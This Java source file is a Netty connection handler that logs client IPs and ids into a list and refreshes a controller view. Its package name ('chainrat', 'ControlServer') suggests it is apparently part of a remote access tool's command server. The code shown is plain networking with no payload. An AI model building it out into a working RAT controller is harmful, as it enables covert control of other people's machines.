package com.nefi.chainrat.server.network.ControlServer;


import com.nefi.chainrat.server.Main;
import io.netty.channel.Channel;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;

public class ConnectionHandler extends ChannelInboundHandlerAdapter {


    @Override
    public void handlerAdded(ChannelHandlerContext ctx) throws Exception{

        Channel incoming = ctx.channel();
        String IP = ctx.channel().remoteAddress().toString();
        String name = ctx.channel().id().asShortText();

        Connection connection = new Connection(name, IP, incoming);
        ChainControlServer.clients.add(connection);
        Main.getMainController().updateList();

        System.out.println("Added connection!");
        System.out.println("IP: " + IP);
        System.out.println("Name: " + name);
    }

    @Override
    public void handlerRemoved(ChannelHandlerContext ctx) throws Exception {
        Channel incoming = ctx.channel();
        Connection connection = ChainControlServer.getConnectionByChannel(incoming);
        ChainControlServer.clients.remove(connection);
        Main.getMainController().updateList();
        System.out.println("Removed Connection");
    }

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        ctx.fireChannelRead(msg);
    }
}
